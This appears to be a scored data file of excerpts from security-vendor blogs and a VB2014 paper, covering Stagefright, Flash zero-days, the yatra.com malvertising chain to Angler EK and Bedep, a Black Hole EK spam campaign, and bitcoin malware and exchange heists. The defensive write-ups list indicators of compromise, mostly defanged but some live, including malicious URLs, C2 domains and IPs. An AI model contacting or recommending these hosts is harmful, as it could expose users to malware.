"Additionally, keep in mind that Stagefright is actually composed of seven different vulnerabilities (plus one more reported on the first attempt to patch) that have been reported at this time. Google already released a first patch but researchers from Exodus already found a bug within the patch. This week Google released another patch to mitigate the vulnerabilities and confirmed that Nexus 4, 5, 6, 7, 9, 10 and Player will receive the new monthly security update in September.
However, there is a major problem with this – who will, for example, receive these patches? Users of devices such as the smartphone Nexus 6 can be sure that this update will be published as Google confirmed. The point is that other vendors may launch the patch only for their latest devices, but still leave most users without patches because neither vendors nor the operators are going to bother to release this update for devices considered obsolete.
Is your Android still vulnerable? Here’s what you can do",0.013344433446833226
"We recommend you to check with your vendor whether you already have a patch for your Android device. However, as we have seen this past week, even the patch could contain an additional bug. Therefore, we suggest you to check whether your device is vulnerable with the ESET Stagefright Detector App, stay alert for new information and if necessary request updates from your vendor to fix this issue.
Finally, we also recommend you to deactivate auto retrieve either under Advanced Settings in case of using Messenger or in Settings / SMS / Auto retrieve in case of Hangouts.
Image credits: © Kham Tram / flickr
",0.010765737179154744
Four Adobe Flash 0-days In Three Weeks - Patches Now Available,0.017024876238536324
"<p>
Following on from the revelation of a 0-day in Adobe Flash in June 2015 (<a href=""http://community.websense.com/blogs/securitylabs/archive/2015/06/24/adob..., since patched) 3 further 0-days have been discovered in the last 3 weeks.&nbsp; The 3 have references CVE-2015-5119, CVE-2015-5122, and CVE-2015-5123.</p>
<p>
The knowledge of the 0-day Proof of Concept code arose from analysis of the data breach from the Italian Hacking Team company.</p>
<h3>
The journey from discovery to exploit kit</h3>
<p>
Within hours of the exploit code being made public it was&nbsp;<a href=""http://malware.dontneedcoffee.com/2015/07/cve-2015-5122-hackingteam-0d-t... have been incorporated into exploit kits including Angler, Neutrino, and NuclearPack.</p>
<p>
Telemetry from our&nbsp;<a href=""https://www.websense.com/content/websense-threatseeker-network.aspx?cmpi... Intelligence Cloud</a>&nbsp;shows a spike in the the number of&nbsp; NuclearPack security incidents that we identified and protected against over the last few days:</p>
<p>
<img alt="""" src=""/sites/default/files/blog/legacy/3463.nuclear_23930.png-550x0.png"" style=""height:247px; width:278px"" /></p>
<h3>
Is your browser trying to tell you something?</h3>
<p>
Firefox has been configured to block the Flash plugin (aka Shockwave Flash) by default.&nbsp; You can see this through a warning presented underneath your address bar when you browse to a website that uses Flash, or there will be an overlay to the Flash artifact that would have been displayed:</p>
<p>
<img alt="""" src=""/sites/default/files/blog/legacy/2330.plugin_has_vuln.png-550x0.png"" style=""height:161px; width:330px"" /></p>
<p>
Further you can access the information via Menu &gt; Add-ons &gt; Plugins.&nbsp; The example below tells us that the version of Flash Player in our environment is known to be vulnerable:</p>
<p>
<img alt="""" src=""/sites/default/files/blog/legacy/3750.flash_blocked.png-550x0.png"" style=""height:25px; width:550px"" /></p>
<h3>
How to update your Flash Player?</h3>
<p>
You can check which version of Flash Player you have running here:&nbsp;<a href=""http://www.adobe.com/software/flash/about/"">http://www.adobe.com/softwar...
<p>
For example, the Adobe website is able to tell us that we are running an older version of Adobe Flash Player in our virtual environment:</p>
<p>
<img alt="""" src=""/sites/default/files/blog/legacy/5584.version_18_0_0_203.png-550x0.png"" style=""height:107px; width:174px"" /></p>
<p>
The latest version of Flash (as of 14 July 2015 2:30pm BST) is 18.0.0.209, 11.2.202.481, or 11.2.202.223 depending on your OS and browser combination.</p>
<p>
You can download the latest version of Flash here:&nbsp;<a href=""https://get.adobe.com/flashplayer/"">https://get.adobe.com/flashplayer/</...
<p>
An alternative mitigation strategy would be to consider if disabling Flash Player is appropriate in your environment.</p>
<p>
You can monitor the Adobe Product Security Incident Response Team (PSIRT) Blog at&nbsp;<a href=""https://blogs.adobe.com/psirt/"">https://blogs.adobe.com/psirt/</a>&nbsp;for details of any upcoming patches should any further vulnerabilities beidentified.</p>
<h3>
Protection Offered to Raytheon|Websense Customers</h3>
<h4>
CVE-2015-5119 &ndash; A Case Study</h4>
<p>
These vulnerabilities, if and when incorporated into existing exploit kits, will still be blocked by Raytheon|Websense solutions because we have a variety of detection techniques across the&nbsp;<a href=""http://www.websense.com/sevenstages?cmpid=slbl"">7 Stages of Advanced Threats</a>&nbsp;via real-time analytics within ACE, our&nbsp;<a href=""https://www.websense.com/content/websense-advanced-classification-engine... Classification Engine</a>.&nbsp; This includes:</p>
<p>
Stage 3 (Redirect) - the detection of known malicious sites</p>
<p>
Stage 6 (Call Home) - detection of command and control channels</p>
<p>
Stage 7 (Data Theft) &ndash; to reduce the occurrence of data exfiltration</p>
<p>
If exploitation of these vulnerabilities is incorporated into wholly new exploit kits then we are capable of detecting malicious behaviour through our heuristics, behavioural monitoring, and analysis techniques.</p>
<p>
We will update coverage as necessary to keep our customers protected.</p>
<h3>
What do we know about these vulnerabilities?</h3>
<p>
Here is a quick summary of the 4 vulnerabilities and their related patches.</p>
<p>
CVE identifier?&nbsp;<a href=""http://community.websense.com/controlpanel/blogs/posteditor.aspx/Adobe%2...
<p>
Rating? Critical</p>
<p>
Impact? Remote code execution and DDOS</p>
<p>
Affected version? 18.0.0.161</p>
<p>
Patched? Yes, in version 18.0.0.194</p>
<p>
CVE identifier?&nbsp;<a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5119"">CVE-2015-5...
<p>
Rating? Critical</p>
<p>
Impact? Remote code execution and DDOS</p>
<p>
Affected version? 18.0.0.194</p>
<p>
Patched? Yes, in version 18.0.0.203</p>
<p>
CVE identifier? CVE-2015-5122</p>
<p>
Rating? Critical</p>
<p>
Affected version? 18.0.0.204 and others.</p>
<p>
Patched? Yes, in version 18.0.0.209 released today, see&nbsp;<a href=""https://helpx.adobe.com/security/products/flash-player/apsb15-18.html"">h...
<p>
CVE identifier? CVE-2015-5123</p>
<p>
Rating? Critical</p>
<p>
Affected version? 18.0.0.204 and others.</p>
<p>
Patched? Yes, in version 18.0.0.209 today, see&nbsp;<a href=""https://helpx.adobe.com/security/products/flash-player/apsb15-18.html"">h...
<p>
<em>Contributors: Andy Settle</em></p>
",0.011930526743210157
Intercept X defends against SettingsContent-ms abuse (video),0.011332009122710374
Even using an older version of our anti-exploit technology will protect you if you open a malicious document with the CVE-2018-8414 exploit embedded in it,0.007722357331486296
"Written by
Andrew Brandt",0.009442099916216584
"August 21, 2018",0.008662567742956262
SophosLabs Uncut CVE-2018-8414 explit Powershell SettingsContent-ms vulnerability,0.005645102129362312
"By Andrew Brandt
Last week, Microsoft released an update that fixes, among other things, an exploitable vulnerability that criminals were actively using to try to infect computers with malware. The exploit, which was given the code name CVE-2018-8414, involves embedding specially-made XML into an Office document, which (when opened) invokes Powershell to download and execute a remotely-hosted malicious payload.
After the patch for this so-called SettingsContent-ms vulnerability was released, engineering director Mark Loman produced a short video showing how the exploit works, and how even a two-year-old installation of Sophos’ Intercept X anti-exploit tool prevents the exploit from functioning, and protects a machine where the user may accidentally try to open a malicious Office document.",0.011166893055633675
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
Top 20 Airline Travel Site Yatra.com Victim to Malvertizing Attack - Redirects Users to Angler EK & Bedep Malware,0.013169731148307662
The popular airline travel site yatra[.]com is currently (01 Feb 2016) redirecting users to Angler Exploit Kit (EK) via a compromised advertising script. The millions of users per month browsing to the yatra[.]com homepage are currently exposed to being redirected to code that silently drops and executes malware in the background by exploiting one of the latest Flash Player vulnerabilities.,0.010701652697999497
Compromised Site,0.00943873621125113
"The website yatra[.]com is a highly popular Indian travel search engine that is ranked 2,262 globally according to Alexa (4,219 according to SimilarWeb) and receives an estimated 7.5 million visitors per month.",0.014425505025600804
fig 1. SimilarWeb stats for yatra[.]com,0.009767120662822482
"The site is using what appears to be a Revive advertizing server script from one of Yatra's other domains, yatrainc[.]com. Since at least January 29, and as of today (February 1) we are seeing this script  injected with code that silently redirects users to the highly prevalent Angler EK.",0.010327323129095678
fig 2. Compromised advertizing script hosted on banners.yatrainc[.]com,0.008295511999699912
The full infection chain we analyzed on January 29 was as follows:,0.011347984831276081
hxxp://yatra[.]com/,0.009334986703706583
--> hxxp://banners.yatrainc[.]com/www/content/afr.php?zoneid=737&target=_blank&cb=1708201502 - (Compromised Revive ad server script),0.012274912874786548
--> hxxp://fersi[.]tk/shop.php?sid={redacted} - (Flash-based redirect),0.012626792743778759
--> hxxp://fersi.tk/hot.php?id={redacted} - (Second redirect to Angler EK),0.01329374578240039
--> hxxp://aimhy.rao1hu038z2[.]space/civis/search.php?keywords={redacted} - (Angler EK),0.012371069891678133
And the full infection chain we analyzed on February 1 was as follows:,0.00845523915518076
hxxp://yatra[.]com/,0.009334986703706583
--> hxxp://banners.yatrainc[.]com/www/content/afr.php?zoneid=737&target=_blank&cb=1708201502 - (Compromised Revive ad server script),0.012274912874786548
--> hxxp://demo.choxedanang[.]com/forex.php?sid={redacted} - (Flash-based redirect),0.012137268219212571
--> hxxp://demo.choxedanang[.]com/home.php?id={redacted} - (Second redirect to Angler EK),0.01453276615866761
--> hxxp://sup.emmiemiller[.]org/forums/viewforum.php?f={redacted} - (Angler EK),0.012450174591541074
Angler Exploit Kit & Bedep Payload,0.008420911506257345
"The infection chain we saw resulted in us being redirected to Angler EK, which proceeded to exploit our Flash Player version 20.0.0.228 by leveraging CVE-2015-8651. We blogged about this new exploit on January 27. The Flash Player exploit we analyzed in this particular attack on January 29 is available on VirusTotal.",0.010915894593786057
"The payload that this variant of Angler EK distributed was a malware known as Bedep, which was loaded in memory rather than being written to disk. Bedep generates its domains with a domain generation algorithm (DGA) - below are some of the most recent domains it has been using:",0.01319843196716175
"crtmzljcejozgp[.]com
kfkyfbjsxnsicve50[.]com
izganktshlyxryjn87[.]com
ltntvidynijnjnvv9e[.]com
bjatnppvspr9q[.]com
debeypjqcbdoy[.]com
terhunucaqhnmdzbie[.]com",0.01620872028521103
"Bedep's usual motive is click-fraud by generating illegitimate traffic to arbitrary web sites in order to generate financial revenue for the criminal operator behind it. However, it is also capable of downloading and executing additional malware. In this case we saw Bedep downloading a variant of the Vawtrak banking trojan. The Vawtrak sample we analyzed is available on VirusTotal.",0.011336816385269954
Indicators Of Compromise,0.010891746748413866
The following indicators of compromise are by no means an exhaustive list.,0.012435631071507247
Malicious Redirects,0.008989322510158715
"fersi[.]tk
demo.choxedanang[.]com",0.009773988369765507
Angler Exploit Kit,0.00827900205047527
"aimhy.rao1hu038z2[.]space
sup.emmiemiller[.]org",0.010407245894741735
Bedep Command-and-Control,0.010858051819828574
"crtmzljcejozgp[.]com
kfkyfbjsxnsicve50[.]com
izganktshlyxryjn87[.]com
ltntvidynijnjnvv9e[.]com
bjatnppvspr9q[.]com
debeypjqcbdoy[.]com
terhunucaqhnmdzbie[.]com",0.01620872028521103
Vawtrak Command-and-Control,0.0103546615582637
"atlasbeta[.]com
dadry[.]com
93.170.104[.]20
91.200.14[.]110
46.161.1[.]105
5.187.2[.]19",0.012472707384667547
Protection Statement,0.009481584346963334
Forcepoint Special Investigations notified:,0.008805031085979964
YATRA via email of the incident shortly after confirming the compromise.,0.011552329412186313
Popular search engines of the compromise once YATRA had acknowledged receipt of the notification and,0.01045562188196103
Badware clearing houses such as https://www.stopbadware.org/,0.01135540706621796
Forecepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:,0.006455238075894765
Stage 2 (Lure) - The injected Flash object on the compromised website is detected and blocked.,0.01154341442813478
Stage 3 (Redirect) - The malicious redirect to Angler EK is blocked in real-time.,0.013931486533728443
Stage 4 (Exploit Kit) - The Angler EK pages are identified and prevented from exploiting the user's browser.,0.014752961108905116
Stage 6 (Backchannel Traffic) - Attempts by both Bedep and Vawtrak to contact their command-and-control servers are detected and blocked.,0.012239073848870019
Observations,0.0075994305810968
"This is yet another example of a site that is serving up malware because an associated site has been compromised. For those hosting and running large sites such as this, it is imperative that the integrity of the whole service is managed consistently and not just focused on the 'front door' site. Equally, it is absolutely crucial to keep up with the basics: ensuring that default credentials are removed and that software is kept updated and patched at all times. More broadly, having a process to handle these incidents when they happen, and they will, is critical to running large web sites such as this. Exercising these response processes before a real incident. Just like the fire-drills we are all now used to, this is a great way to identify systemic flaws before they are identified during the heat of a real incident.",0.011522650831189418
"Most important of all is that time is of the essence: high profile sites such as this one that have millions of visitors are magnets for the criminals.  In this particular case, the criminals know they have the opportunity to compromise over quarter of a million visitors every day that the malware is still being served up by the site.",0.01682639196170521
Summary,0.009602684635656611
"Criminals are continuing their efforts to maximize the potential number of victims.  They are compromising scripts on hosts that are used by highly popular sites, without having to compromise the target site itself. These criminals are able to turn this traffic into financial revenue by installing click-fraud malware onto a victims' machines in order to generate traffic to URLs of their choosing. Alternatively, they may drop crypto ransomware or other dangerous malware onto the target machine as we have also seen recently.
",0.01209424275062676
"American Airlines customers, watch where you click! Cybercriminals are currently spamvertising millions of emails impersonating the company in an attempt to trick end and corporate users into clicking on the malicious links found in the spamvertised email.
Upon execution, the campaign redirects users to a Black Hole exploit kit landing URL, where client-side exploits are served against outdated third-party software and browser plugins.
More details:",0.011902541200022876
Screenshots of a sample spamvertised email:,0.01088835452232606
"Once users click on any of the links in the spamvertised email, they are exposed to the following fake “Page loading…” page:",0.008971488592210641
"Spamvertised URLs: hxxp://luxify.net/wp-admin/aair.html redirects to -> hxxp://princess-sales.net/main.php?page=7e45713861176c6b (203.237.211.223) or hxxp://ghanarpower.net/main.php?page=8c6c59becaa0da07 (203.237.211.223)
Upon successful client-side exploitation of CVE-2010-1885, the Black Hole exploit kit drops the following MD5 on infected hosts: MD5: c70d309171d9844f331081b3c3d80ff
Detection rate: Detected by 25 out of 42 antivirus scanners as Trojan.Generic.KDV.664936; Worm:Win32/Cridex.E
Upon execution, the sample phones back to 210.56.23.100:8080/za/v_01_b/in/",0.010870880274909678
"Responding to 210.56.23.100, AS7590, COMSATS Commission on Science and Technology for Sustainable Development in the South, are the following command and control servers:
cpojkjfhotzpod.ru
upjachkajasamns.ru
cruoinaikklaoifpa.ru
sumgankorobanns.ru
fedikankamolns.ru
ciontooabgooppoa.ru
caskjfhlkaspsfg.ru
csoaspfdpojuasfn.ru
amanarenapussyns.ru
cparabnormapoopdsf.ru
cjhsdvbfbczuet.ru
caoodntkioaojdf.ru
clkjshdflhhshdf.ru
zolindarkksokns.ru
cnnvcnsaoljfrut.ru
cruikdfoknaofa.ru
cjiahkhklflals.ru
dinamitbtzusons.ru
cjjasjjikooppfkja.ru
ckjsfhlasla.ru
kroshkidlahlebans.ru
ckjhasbybnhdjf.ru
xspisokdomenidgmens.ru
dkijhsdkjfhsdf.ru
dhjikjsdhfkksjud.ru
dsakhfgkallsjfd.ru
dphsgdfisgdfsdf.ru
dkjhfkjsjadsjjfj.ru
debiudlasduisioa.ru
dpasssjiufjkaksss.ru
doorpsjjaklskfjak.ru
dnvfodooshdkfhha.ru
xstriokeneboleeodgons.ru
dpaoisosfdhaopasasd.ru
rushsjhdhfjsldif.su
dkjhasjllasllalaa.ru
puidhfhhaoadans.su
somaniksuper.ru
superproomgh.ru
samsonikonyou.ru
phfhshdjsjdppns.su
dhjhgfkjsldkjdj.ru
poosdfhhsppsdns.su
insomniacporeed.ru
The name servers infrastructure of these domains is parked at the following IPs 94.63.147.96; 171.25.190.249; 188.116.32.177
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.018175348422940107
"VB2014 paper: Well, that escalated quickly: from penny stealing malware to multi-million-dollar heists, a quick overview of the bitcoin bonanza in the digital era
2014-11-07",0.011884523323237195
"Santiago Pontiroli
Kaspersky Lab
,
Argentina
Editor:
Martijn",0.01015979597793093
"Grooten
Abstract
From the rise and demise of Silk Road to the current state of the crypto-currency frenzy, the story of bitcoin involves mysterious characters, million-dollar robberies and stealthy malware that will make you think twice before going online with your money. In his VB2014 paper, Santiago Pontiroli looks at the most interesting malware samples that target the popular bitcoin currency and some of the major events that surrounded it during this past year. He also investigates the flaws that allowed several bad guys to steal more money than one could ever imagine, and how they did it without ever firing a gun or stepping into a bank. Finally, he rounds off with some of the benefits that digital currencies offer to Latin American countries and the state of crypto-currency-stealing malware in the region and worldwide.
Copyright © 2014 Virus Bulletin",0.01465081758738851
"Abstract
From the rise and demise of Silk Road to the current state of the cryptocurrency frenzy, we’ll travel together on this journey of mysterious characters, million-dollar robberies and stealthy malware that will make you think twice before going online with your money.
In this presentation, we’ll analyse the most interesting malware samples that target the popular bitcoin currency as well as some of the major events that have surrounded it during this past year. We’ll investigate the flaws that have allowed several bad guys to steal more money than one could ever imagine, and look at how they did it without ever firing a gun or even stepping into a bank.
We’ll round off with a look at some of the benefits that digital currencies offer to Latin American countries, and at the state of cryptocurrency-stealing malware both in the Latin American region and worldwide. Ranging from malicious PACs to botnets, we’ll get our hands dirty with some interesting technical details and statistics.
Hold on to your seats, this is going to be one bumpy (but fun) crypto-ride, uncovering hidden Latin America’s cybercriminal operations!",0.013908344998413869
"Introduction
It all started around 2009, when a mysterious character using the pseudonym Satoshi Nakamoto released his research about a peer-to-peer electronic cash system, now popularly known as bitcoin. It promised several advantages over current cash systems, but little did we know the kind of changes it would bring to our everyday lives and the global economy as a whole.
Like any currency, bitcoin can be used to purchase or sell goods, as a unit for value measurement or as value storage, which can be saved and spent at a future point in time. It’s unclear what the stable (fair) value of the currency will be until it reaches its maximum at 21 million units – currently, there are around 12 million units in circulation. It may still be looked upon by some as ‘play money’, or reserved just for the geeky crowd, but bitcoin is changing the way we see digital currencies, and increasingly resembling an interesting large-scale economy experiment with real-life benefits and consequences.
Due to the fact that the bitcoin currency is not controlled by a central authority, but by its contributors, it has made some governments rather nervous, resulting in a heated debate about whether it should be regulated. However, regulation is not entirely feasible, given the initial design of the bitcoin currency and network. After 2010, Satoshi disappeared from the project he created without leaving a trace (or so he thought), resulting in many urban legends about his revolutionary invention and secretive identity. What we know for sure is that after many years, bitcoin is as strong as ever.
Digital currencies have many potential advantages when we compare them to their real-life counterparts. They’re fast, taking only around ten minutes to verify a transaction, and cheap, liberating the user from the need to maintain or pay processing fees to a credit card company. If we add the benefits of decentralization, privacy (not equal to anonymity) and ubiquity, we can begin to understand the temptation to invest time and money in bitcoins.
In some regions, especially Latin America, where the local currency suffers progressive and continuous devaluation, and the yearly inflation makes alternative currencies a viable and attractive option for saving your hard-earned salary, bitcoin is gaining momentum. In Argentina, an unofficial inflation rate of 25%, a 35% fee for credit card purchases in non-local currencies, and fears of another economic crash like the one in 2001, are forcing Argentinians to pay quite poor black market rates to get their hands on precious dollars or euros, albeit illegally. In the same way, the tech-savvy middle and upper classes are beginning to see bitcoin as a (legal) alternative to stashing American dollars.
‘The most fertile ground for Bitcoin is in places like Cyprus, Argentina, Iceland, China and other countries which have experienced significant financial disruptions and/or maintain strict financial controls.’ – Garrick Hileman, economic historian at the London School of Economics.
Figure 1. The percentage of users attacked by different types of malware each month [1].
While some early adopters have been involved in the bitcoin market from the beginning (by means of mining or simply by participating in exchanges), others are just grasping the concept of cryptocurrencies and learning about the perils of bitcoin by force – be it in the form of ransomware demanding a quick payment or malicious mining code consuming their limited computing resources. From wallet-stealing malware to large scale bitcoin exchange heists, we can find just about anything in the crypto world, and this is just the beginning. Nowadays, we talk about malware and cybercrime as two sides of the same (bit)coin, usually referring to organized gangs of criminals with a clear differentiation of roles engaged in illegal activities with the sole purpose of financial profit. It makes sense, then, to observe a correlation in the number of malware samples targeting bitcoin users in the wild and the price of the currency being exchanged in markets worldwide.",0.02160520278380562
Flaws of the bitcoin protocol,0.010599644630674532
"Transaction malleability
Made infamous by one of the (many) incidents suffered by the Mt. Gox exchange, transaction malleability is amongst the most common flaws discussed regarding the bitcoin protocol. However simple, and known about by the community since 2010, it has proven to be an effective method of attack in cases where one of the parties involved in the transaction is using a custom developed bitcoin wallet that doesn’t take this flaw into consideration. The problem occurs due to the fact that the transaction ID (TXID) can be changed by a malicious node before the transaction is confirmed on the network. In this way, it can be made to appear as if the transaction didn’t happen, forcing the sender to retry the operation (and in effect, withdrawing the funds once again).
As described in the research carried out by Christian Decker and Roger Wattenhofer, entitled ‘Bitcoin Transaction Malleability and Mt. Gox’ [2], there are very few indicators to suggest that transaction malleability was the sole cause of the demise of the popular bitcoin exchange. By analysing the incidents reported within the timeline in which they were made public, it seems that for the 850,000 bitcoins to disappear, a substantial number of transaction malleability attacks would have to have taken place in the network. Decker and Wattenhofer’s research suggested that barely 386 bitcoins could have been stolen using malleability attacks – the difference is enough to blame bad business practices and not protocol flaws as the cause of Mt. Gox’s bankruptcy and missing funds.",0.01509586732723478
"Your PC is now stoned – illegal content in the blockchain
Although not entirely illegal, a curious piece of code was found within the bitcoin blockchain recently. Microsoft’s Security Essentials detected the signature of the STONED virus, popping up warnings about threats found inside the blockchain. This might be just an amusing anecdote now, but since the entire blockchain is downloaded for each client in order to be part of the network, we can wonder about the inclusion of illegal material there. Holding such material would be cause for prosecution in some countries, which is why a limitation on data storage in outbound transactions has been proposed [3].
Figure 2. Any content inserted in the blockchain will persist for the lifetime of the bitcoin network.",0.015575219419169728
"The 51% attack
If a single malicious entity were to control more than 50% of the network’s mining hash rate, it would have full control of the bitcoin network and the possibility of manipulating the blockchain at will. Even though theoretically possible, the prohibitive cost of performing such an attack leaves well funded agencies or governments that have massive computational power at their disposal as the only possible parties with the capability of engaging in this kind of network takeover.
Since bitcoin is considered a decentralized currency, there would be no single authority in charge of monitoring or stopping such an attack if it were to happen. Fortunately, it would be more profitable for an attacker simply to follow the rules of the network in order to maximize profits, instead of targeting their hashing power for malicious purposes. Conspiracy theories have been discussed, and the idea of someone pursuing this activity in order to create financial mayhem, causing bitcoin holders to lose confidence in the currency with a following rapid decline of the unit value is possible, but still highly unlikely to happen.
An attacker would be capable, for example, of reversing transactions sent by him or preventing other transactions from getting the confirmations needed to be added in the blockchain. It would still not be possible to reverse other people’s transactions or prevent transactions from being sent at all. Modifications of the protocol itself still wouldn’t be possible, and creating coins out of thin air or the attacker sending coins that never belonged to him is still out of scope [4].
A different scenario is presented when discussing mining pools. In the case of bitcoin, several months ago, the Ghash.io pool used by the cloud hashing platform Cex.io was nearing 51% of the total bitcoin network hashrate. A great number of miners noticed this issue and changed pools immediately in order to avoid giving Ghash.io any more privileges over the network than it deserved. It is now considered good practice for mining pools to increase their fee when reaching the critical hashrate level so as to spread the miners (and their computing power) as evenly as possible.
Figure 3. Distributed bitcoin network hashrate (as of 30 May 2014), sampling the last 30 days [5]. Currently displaying a combined computing hashrate of 82.19PH/s.
Other cryptocurrencies have suffered the same ethical dilemma. Coinotron is a multi-coin mining pool [6]. The litecoin community noticed a combined hashrate of 51% for this pool and decided to take action in the same manner as seen in the bitcoin community. Currently, Coinotron’s hashrate is at around 38%, showing the preoccupation and involvement of the community in keeping their network from being controlled by a single entity.
Figure 4. Distributed litecoin network hashrate as of 30 May 2014. The average total hashrate is approximately 281GH/s compared to the 40.615GH/s rate exhibited by the dogecoin scrypt-based mining network [7].
One interesting aspect of the hashrate reported by most mining pools is that the Pareto principle still applies to the digital economy. In Coinotron, for example, 20 registered miners controlled approximately 37% of the network. This has more implications than may appear obvious – not only economical, but technological too. One cannot reach this level of processing power without resorting to ASICs and custom-built mining farms. Cryptocurrencies are no doubt theoretically decentralized, but the power is still in the hands of a few miners.
Figure 5. Comparison between the mining difficulty rates amongst the most popular cryptocurrencies.",0.02605308078324431
"Denial of service
It is not only bitcoin exchanges that can be the target of massive distributed denial of service attacks [8], but also the network itself. While not affecting the funds of bitcoin users, these attacks prevent transactions from being confirmed, creating confusion in the network and aiding transaction malleability attacks. Even though bitcoin has some built-in protection against denial-of-service attacks, it has been found to be vulnerable to such types of attack (and will probably continue to be in the future).",0.02015373905196316
"Vulnerabilities
Like any other software, the ‘Bitcoin Core’ client has bugs and vulnerabilities which can be exploited. Analysing the CVE database, we can see that most of the vulnerabilities are denial of-service-related. In spite of this, even the Heartbleed vulnerability [9] took the bitcoin world by surprise. Even though a fix was quickly released in version 0.9.1, and exchanges adopted the patch as soon as it was made available, this demonstrated how even a crypto bug in a related project (OpenSSL) could impact the security of the client, and the bitcoin unit value.
Figure 6. CVE details datasource query for bitcoin software and protocol-related vulnerabilities, displaying a predominance of DoS vulnerability type [10].
(Click here to view a larger version of Figure 6.)",0.013642312690177794
"Anything else?
It’s no wonder that cybercriminals see cryptocurrencies as a golden opportunity, with phishing scams relying on social engineering and bitcoin-stealing malware being common denominators in today’s digital economy. The increase in bitcoin related malware goes hand in hand with the increase in the currency’s value, giving the phrase ‘following the money trail’ a whole new meaning.
As in the rest of the malware world, most of the bitcoin-related malware samples found target the Windows operating system, with very few of them targeting Mac OSX or Linux. In the mobile world, Android has the virtual monopoly on bitcoin related infections, be they wallet stealers or even mining applications. As we have seen, there are many intrinsic flaws with the bitcoin protocol, although PEBKAC (problem exists between keyboard and chair) still holds true and users are the most common target for cybercriminals.
Losing the key to the wallet in which bitcoins are stored is a common problem in the bitcoin community, leaving any amount of savings locked up, and creating ‘idle’ coins which won’t be able to be used in the future.
Money laundering or ‘bitwashing’, mining botnets and the use of bitcoins to purchase illegal goods and services are just some of the issues that can’t be categorized quite as easily. With currency exchanges headlining in newspapers around the world pretty much every week, it’s difficult to blindly trust bitcoin, but after all of the incidents witnessed, we are now seeing a new generation of exchanges, with better business practices and, one can only hope, better security.",0.015232989806938324
"Cryptopocalypse now - history of bitcoin exchange incidents
For quite some time, not a single week has gone by without one of the major bitcoin exchanges reaching mainstream news. We can attribute the success of some attacks to faulty technical implementations of the bitcoin wallet, others to clever social engineering approaches, and the rest to bad business practices and simple failure to adhere to proven security standards. There are too many incidents to list them all, but a handful of the most prominent ones are detailed in the paragraphs that follow. They all make great learning tools for the new generation of bitcoin exchanges.
Flexcoin, described as the ‘world’s first bitcoin bank’ had its online storage stolen on 2 March 2014, with 896 bitcoins disappearing from ‘hot wallets’ in this single incident. Without ever firing a single gunshot, attackers demonstrated that we had already entered a new era of bank robberies. The loot of around 600,000 USD was enough to demonstrate the importance of the crypto market and highlight the lack of security measures taken by most of the exchange houses in the business. Stopping all transactions and shutting down the service was the first step to be taken after the rest of the common procedures for handling these situations. Unlike fiat currency handling banks, where insurance policies are in place, here there wasn’t anyone to cover the losses, and the only way to resolve the issue was to return the funds present in cold storage and declare the end of the service.
In the same weekend, Poloniex announced a minor but crucial software bug that would ultimately decide the fate of this digital currency exchange business. On 4 March 2014, Poloniex owner Tristan D’Agosta announced on the Bitcoin Talk forum that the service had been hacked due to a bad implementation of the method in charge of checking the balance for all transactions the site handled. Apparently, the service allowed multiple withdrawals to be made without the software being able to check quickly enough for negative balances, leaving the possibility of stealing funds from the site’s pool. As a result of not being able to cover the losses, the owner decided to deduct 12.3% from all accounts present on the site at that moment in order to keep on functioning.
On 14 March 2014, Bitcurex was on the front page of every major bitcoin news site, claiming that 10% to 20% of the funds present in its ‘hot wallet’ system had been stolen. As with other services, shutting down the website and halting transactions was the first measure taken – before even announcing that anything had gone wrong, leaving many users wondering what had happened to their money. Not long afterwards, Bitcurex announced through its website that it would resume operations on 18 March, and that, due to good monitoring practices, only part of the funds present in its system had been stolen, preventing a larger attack from happening.
Picostocks, which according to its official description facilitates valuation and fundraising for high-tech startup projects and companies and offers services for both bitcoin investors and entrepreneurs, lost 5,896 bitcoins on 29 November 2013. It had both its hot and cold wallet systems hacked, losing enough funds to raise suspicion of an ‘inside job’ from the bitcoin community.
A quarter-million-dollar heist is not something to frown upon, given the circumstances in which the following robbery took place. By accessing an unencrypted backup set of keys used for the Bitfloor exchange’s wallet, the robbers had the keys to the kingdom to do their ill deeds at will. As with other exchanges, Bitfloor ceased all trading operations and promised to repay its customers. This demonstrated the instability and vulnerability of the bitcoin exchange industry as much as any of the other infamous cases. At a market value of 10.40 USD per unit, getting 250,000 USD for finding the keys to the vault seems like a good pay day for any cybercriminal. Bitfloor was the fourth bitcoin-based exchange, closely behind Mt. Gox, BTC-E and Bitstamp, but it was no stranger to similar incidents, having lost 25,000 user coins in 2012.
During its period of activity in 2011–2012, Bitcoin Savings and Trust showed the world that Ponzi schemes could also exist in a digital currency scenario. With 3,700 bitcoins stolen, this financial fraud, courtesy of Trendon T. Shavers, came as little shock to anyone. Owner of a service previously known as ‘First Pirate Savings and Trust’, Trendon (known online as ‘pirateat40’) was a Texan investor who promised weekly returns of 7% for your investment. The US Securities and Exchange Commission (SEC) called a halt to this operation, and the ‘Bernie Madoff of bitcoin’ had to cease his activities and face the music.
On 1 October 2013, Canadian Bitcoins entered the hall of fame for the silliest heist made on a bitcoin exchange. With nothing more than a chat session and smooth talk, a crafty cybercriminal convinced an attendee at Rogers Data Centre to reboot the Canadian Bitcoins server in fail safe mode, bypassing all security measures. Obtaining 149 bitcoins (worth 100,000 USD at the time) from hot wallet storage was the end result of this ‘hack’. James Grant, the owner of Canadian Bitcoins, was puzzled to say the least, but still managed to cover the losses from his own pocket.
Bitcoinica witnessed two attacks during 2012 – one in July and one in May – setting a precedent in the local courts as the second case involving bitcoin to be filed in the legal system. Four users registered a complaint, asking to be compensated with 460,000 USD for the funds lost and grievance suffered. Even though at the time, the 18,547 bitcoins stolen were worth 90,000 USD, it made sense for the users to ask for a substantially higher compensation, given the ever-changing value of bitcoin.
Inputs.io’s owner, ironically named ‘TradeFortress’, gave the bitcoin community an important security lesson after losing 4,100 BTC (1.2 million USD), stating: ‘I don’t recommend storing any bitcoins accessible on computers connected to the Internet’. Talk about bad timing: by 23 October 2013, these bitcoins were in the possession of a social engineer who managed to bypass the two-factor authentication used by the server hosted on the Linode cloud-hosting platform. The attacker compromised several mail accounts and finally was able to reset the server’s master password.
Figure 7. List of bitcoin heists with the most media coverage [11] shown in a logarithmic scale. Values taken from approximate historical BTC prices [12].
(Click here to view a larger version of Figure 7.)",0.024545918365751485
"Mt. Gox declares bankruptcy
